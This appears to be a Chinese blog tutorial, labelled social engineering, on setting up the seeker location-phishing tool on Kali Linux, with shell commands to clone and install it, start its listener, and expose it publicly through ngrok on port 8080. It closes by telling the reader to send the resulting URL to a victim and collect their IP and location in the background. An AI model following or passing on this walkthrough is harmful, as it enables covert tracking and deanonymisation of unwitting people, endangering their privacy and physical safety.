【社会工程】kail搭建GPS定位系统
2021-02-02 16:06:47

1-1. 前言
2-2. kail中seeker安装
3-3. kail中ngrok安装
1-1: seeker-获取高精度定位

介绍：seeker是一个通过页面获得高精度位置信息的模拟脚本。这个应用场景很常见，你在移动端访问某些页面时（特别是微信页面）经常会提示要请求位置信息，如果你点了允许，那么你的信息就会被收集。这个脚本的用途也是一样的。


1-2 ：kail 中安装 seeker
运行环境：kail liunx
首先在github 上下载seeker 软件库
命令：git clone http://github.com/thewhiteh4t/seeker.git
下载完成后，cd到seeker 目录 执行脚本 ./install.sh

1-3:安装报错说是pip3 没有安装

1-4:解决问题 应该是源的问题
编辑源：vim /etc/apt/sourcrs.list
更新：apt-get update

1-5：以上不好使kail 安装pip3
`pip3(python3)安装

wget https://bootstrap.pypa.io/get-pip.py

python3 get-pip.py

pip -V`

2-2 启动seeker

python3 seeker.py -t manual 



2-3 解读每行的意思，已经成功开启监听

3-3. kail中ngrok安装
3.3.1 ngrok介绍：ngrok 是一个反向代理，通过在公共的端点和本地运行的 Web 服务器之间建立一个安全的通道 https://ngrok.com/download
下载完成后，解压，cd到目录下
直接执行文件 后面跟上通信协议 转发端口
以为seeker监听8080 所以是8080
执行./ngrok http 8080

总结：发送给url给受害者，后台获取ip
